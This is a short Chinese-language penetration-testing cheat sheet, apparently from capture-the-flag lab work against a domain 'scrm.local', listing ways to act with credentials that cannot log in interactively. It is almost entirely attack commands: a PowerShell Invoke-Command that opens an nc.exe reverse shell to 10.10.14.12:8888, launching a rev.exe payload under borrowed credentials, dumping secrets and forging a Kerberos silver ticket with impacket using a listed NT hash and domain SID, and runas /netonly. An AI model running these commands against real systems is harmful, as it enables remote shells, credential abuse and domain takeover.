# \*有凭证但是无法登陆

1. 方法一（借凭证）

```bash
命令在{}中，密码用户名以及第三行的dc01自己修改

$SecPassword = ConvertTo-SecureString 'ScrambledEggs9900' -AsPlainText -Force

$Cred = New-Object System.Management.Automation.PSCredential('scrm.local\MiscSvc', $SecPassword)

Invoke-Command -Computer dc1 -Credential $Cred -Command { cmd /c C:\Temp\nc.exe -e powershell 10.10.14.12 8888 }

或者
$secpasswd = ConvertTo-SecureString "aliceishere" -AsPlainText -Force
$mycreds = New-Object System.Management.Automation.PSCredential ("alice", $secpasswd)
$computer = "Bethany"
[System.Diagnostics.Process]::Start("C:\hfs\rev.exe", "", $mycreds.Username, $mycreds.Password, $computer)
到这是反弹了一个高权限cmd
下面这一步是从cmd再反弹一个ps，没必要
powershell -ExecutionPolicy Bypass -File C:\hfs\rev.ps1

```

1. 方法二（票据利用存在疑问）

```bash
1. 获取sid值
impacket-secretsdump -k scrm.local/ksimpson@dc1.scrm.local -no-pass -debug
2. 生成ntml hash
https://codebeautify.org/ntlm-hash-generator
3. 生成票据（记得把sid后面的用户标示去掉）
impacket-ticketer -domain scrm.local -spn MSSQLSVC/dc1.scrm.local -user-id 500 Administrator -nthash B999A16500B87D17EC7F2E2A68778F05 -domain-sid S-1-5-21-2743207045-1827831105-2542523200
4. 使用票据登陆
export KRB5CCNAME=Administrator.ccache
impacket-mssqlclient dc1.scrm.local -k -no-pass
```

1. 方法三（凭据注入）

```clike
runas.exe /netonly /user:domain.tld\username cmd.exe
```
